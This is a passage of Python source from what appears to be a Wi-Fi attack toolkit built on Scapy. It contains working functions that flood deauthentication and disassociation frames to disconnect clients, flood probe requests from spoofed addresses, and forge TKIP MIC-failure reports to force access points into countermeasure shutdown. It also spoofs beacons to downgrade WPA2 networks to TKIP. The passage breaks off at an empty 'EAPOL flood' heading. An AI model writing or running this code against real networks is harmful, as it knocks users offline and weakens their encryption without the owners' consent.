def _run_deauth_flood(
    interface: str,
    bssid: str,
    client: str,
    count: int,
    delay: float,
    reason: int,
    verbose: bool,
) -> int:
    """Inject Deauth and Disassoc frames to disconnect one or all clients.

    Each cycle sends one Dot11Deauth and one Dot11Disas frame (AP->STA
    direction). When client is broadcast all associated stations are targeted.

    Args:
        interface: Monitor-mode interface.
        bssid: Target AP BSSID.
        client: Client MAC or broadcast address.
        count: Maximum cycles (0 = infinite).
        delay: Delay between cycles in seconds.
        reason: IEEE 802.11 reason code.
        verbose: Emit progress logs every 50 cycles when True.

    Returns:
        Total frames injected (2 per cycle).
    """
    from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, sendp

    bssid_l = bssid.lower()
    client_l = client.lower()
    sent = 0
    limit = count if count > 0 else 10 ** 9

    try:
        for i in range(limit):
            deauth = (
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=client_l, addr2=bssid_l, addr3=bssid_l) /
                Dot11Deauth(reason=reason)
            )
            disas = (
                RadioTap() /
                Dot11(type=0, subtype=10,
                      addr1=client_l, addr2=bssid_l, addr3=bssid_l) /
                Dot11Disas(reason=reason)
            )
            sendp(deauth, iface=interface, verbose=False)
            sendp(disas, iface=interface, verbose=False)
            sent += 2

            if verbose and i % 50 == 0 and i > 0:
                print_status(f"Deauth flood: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode p -- Probe request flood                                              #
# --------------------------------------------------------------------------- #

def _run_probe_flood(
    interface: str,
    ssids: list[str],
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Flood APs with Dot11ProbeReq frames for a list of SSIDs.

    Saturates APs that reply to every probe request, consuming their
    processing time with spoofed probe sender addresses.

    Args:
        interface: Monitor-mode interface.
        ssids: SSIDs to probe; empty list uses random SSIDs each frame.
        count: Maximum frames (0 = infinite).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import Dot11, Dot11Elt, Dot11ProbeReq, RadioTap, sendp

    sent = 0
    limit = count if count > 0 else 10 ** 9

    try:
        for i in range(limit):
            ssid = ssids[i % len(ssids)] if ssids else _random_ssid()
            src = _random_mac()
            enc_ssid = ssid.encode("utf-8", errors="replace")

            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=4,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=src,
                      addr3="ff:ff:ff:ff:ff:ff") /
                Dot11ProbeReq() /
                Dot11Elt(ID="SSID", info=enc_ssid, len=len(enc_ssid)) /
                Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"Probe flood: {sent} frames sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode m -- Michael MIC shutdown                                             #
# --------------------------------------------------------------------------- #

def _run_michael_shutdown(
    interface: str,
    bssid: str,
    client: str,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Force TKIP countermeasures on the target AP via MIC error reports.

    Crafts EAPOL-Key frames with the Error and Request bits set (pairwise TKIP
    MIC failure reports). Two MIC error reports within 60 seconds trigger the
    TKIP countermeasures timer: the AP blocks all TKIP clients for 60 seconds
    and deauthenticates them.

    Args:
        interface: Monitor-mode interface.
        bssid: Target AP BSSID.
        client: STA MAC to impersonate (broadcast selects a random one).
        count: Number of error report frames (0 = infinite).
        delay: Delay between frames in seconds.
        verbose: Emit progress logs every 10 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import LLC, SNAP, Dot11, RadioTap, Raw, sendp

    bssid_l = bssid.lower()
    sta_mac = (
        _random_mac()
        if client.upper() == "FF:FF:FF:FF:FF:FF"
        else client.lower()
    )
    sent = 0
    limit = count if count > 0 else 10 ** 9

    # Key Info: TKIP (0x0001) | Pairwise (bit 3) | MIC (bit 8) | Error (bit 10) | Request (bit 11)
    KEY_INFO_MIC_ERROR = 0x0001 | 0x0008 | 0x0100 | 0x0400 | 0x0800  # 0x0D09

    try:
        for i in range(limit):
            nonce = os.urandom(32)

            eapol_key_body = struct.pack(
                ">BHH",
                2,                      # descriptor_type: RSN/IEEE 802.11
                KEY_INFO_MIC_ERROR,     # key_info
                0,                      # key_length (0 for error report)
            )
            eapol_key_body += struct.pack(">Q", i + 1)  # replay_counter
            eapol_key_body += nonce                      # key_nonce (32 bytes)
            eapol_key_body += b"\x00" * 16              # key_iv
            eapol_key_body += b"\x00" * 8               # key_rsc
            eapol_key_body += b"\x00" * 8               # key_id
            eapol_key_body += b"\x00" * 16              # key_mic (zeroed for error report)
            eapol_key_body += struct.pack(">H", 0)      # key_data_length

            eapol_frame = struct.pack(
                ">BBH",
                2,                          # EAPOL version
                3,                          # type: EAPOL-Key
                len(eapol_key_body),
            ) + eapol_key_body

            pkt = (
                RadioTap() /
                Dot11(type=2, subtype=8,
                      FCfield="to-DS",
                      addr1=bssid_l,
                      addr2=sta_mac,
                      addr3=bssid_l) /
                LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
                SNAP(OUI=0x000000, code=0x888E) /
                Raw(load=eapol_frame)
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 10 == 0:
                print_status(f"Michael MIC shutdown: {sent} reports sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode g -- WPA downgrade                                                    #
# --------------------------------------------------------------------------- #

def _run_wpa_downgrade(
    interface: str,
    bssid: str,
    count: int,
    delay: float,
    verbose: bool,
) -> int:
    """Inject beacons with a stripped RSN IE to force WPA/TKIP negotiation.

    Sniffs one real beacon from the target AP to clone its SSID and channel,
    then replays a modified version where the RSN IE advertises TKIP only
    (CCMP removed). Clients that reassociate will attempt TKIP if their
    supplicant accepts the downgraded advertisement.

    Args:
        interface: Monitor-mode interface.
        bssid: Target AP BSSID.
        count: Maximum frames (0 = infinite).
        delay: Inter-frame delay in seconds.
        verbose: Emit progress logs every 100 frames when True.

    Returns:
        Total frames injected.
    """
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, sniff

    bssid_l = bssid.lower()
    ssid = "DowngradedAP"
    ch = 6
    rsn_body = _build_rsn_ie_tkip_only()

    # Attempt to capture one real beacon to extract SSID and channel.
    try:
        captured = sniff(
            iface=interface,
            lfilter=lambda p: (
                p.haslayer(Dot11Beacon) and
                p.addr2 is not None and
                p.addr2.lower() == bssid_l
            ),
            count=1,
            timeout=5,
        )
        if captured:
            elt = captured[0].getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == 0 and elt.info:
                    ssid = elt.info.decode("utf-8", errors="replace")
                elif elt.ID == 3 and elt.info:
                    ch = elt.info[0]
                elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
    except Exception as exc:
        logger.debug("Beacon sniff for downgrade failed: %s", exc)

    enc_ssid = ssid.encode("utf-8", errors="replace")
    sent = 0
    limit = count if count > 0 else 10 ** 9

    try:
        for _ in range(limit):
            pkt = (
                RadioTap() /
                Dot11(type=0, subtype=8,
                      addr1="ff:ff:ff:ff:ff:ff",
                      addr2=bssid_l, addr3=bssid_l) /
                Dot11Beacon(cap="ESS+privacy") /
                Dot11Elt(ID="SSID", info=enc_ssid, len=len(enc_ssid)) /
                Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                Dot11Elt(ID="DSset", info=bytes([ch])) /
                Dot11Elt(ID=48, info=rsn_body, len=len(rsn_body))
            )
            sendp(pkt, iface=interface, verbose=False)
            sent += 1

            if verbose and sent % 100 == 0:
                print_status(f"WPA downgrade: {sent} beacons sent")
            if delay:
                time.sleep(delay)
    except KeyboardInterrupt:
        pass

    return sent


# --------------------------------------------------------------------------- #
#  Mode e -- EAPOL flood                                                      #
# --------------------------------------------------------------------------- #

